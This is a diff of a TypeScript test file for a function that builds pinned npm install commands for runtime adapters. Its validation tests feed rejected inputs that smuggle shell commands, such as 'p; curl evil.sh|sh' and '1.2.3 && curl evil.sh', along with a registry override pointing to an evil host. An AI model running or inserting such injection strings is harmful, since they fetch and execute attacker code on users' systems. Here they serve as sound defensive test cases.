@@ -200,16 +200,22 @@ test("a custom Runtime joins the catalog with no built-in policy of its own", as
   assert.equal(trusted.capabilities.suppression, false);
 });
 
+/** A global-storage path shaped like a real one: macOS puts a space in it. */
+const HOME = "/home/user/Application Support/conductor/adapters";
+
 test("installing an adapter names one exact release and nothing looser", () => {
   const [claude] = builtinRuntimes(policy);
-  const install = adapterInstallCommand(claude.adapter as { package: string; version: string; bin: string });
+  const install = adapterInstallCommand(
+    claude.adapter as { package: string; version: string; bin: string },
+    HOME,
+  );
 
-  assert.equal(install.command, "npm");
-  assert.ok(install.args.includes(`${claude.adapter?.package}@${claude.adapter?.version}`));
+  assert.match(install, /^npm install --prefix /);
+  assert.ok(install.includes(`${claude.adapter?.package}@${claude.adapter?.version}`));
 
   for (const loose of ["latest", "^1.2.3", "1.2", "01.2.3", "1.2.3 && curl evil.sh"]) {
     assert.throws(
-      () => adapterInstallCommand({ package: "p", version: loose, bin: "p" }),
+      () => adapterInstallCommand({ package: "p", version: loose, bin: "p" }, HOME),
       /exact version/,
       `version "${loose}" must be refused`,
     );
@@ -345,12 +351,12 @@ test("a pin for an adapter the user replaced does not outlive it", async () => {
 test("installing an adapter refuses a package name that is not one", () => {
   for (const name of ["--registry=http://evil.example", "-g", "--global", "p; curl evil.sh|sh", "", "@scope", "../etc"]) {
     assert.throws(
-      () => adapterInstallCommand({ package: name, version: "1.2.3", bin: "p" }),
+      () => adapterInstallCommand({ package: name, version: "1.2.3", bin: "p" }, HOME),
       /package name/,
       `package "${name}" must be refused`,
     );
   }
-  assert.ok(adapterInstallCommand({ package: "@scope/pkg", version: "1.2.3", bin: "p" }).args.length);
+  assert.ok(adapterInstallCommand({ package: "@scope/pkg", version: "1.2.3", bin: "p" }, HOME).length);
 });
 
 test("a runtime id that names an Object prototype member does not take the catalog down", () => {
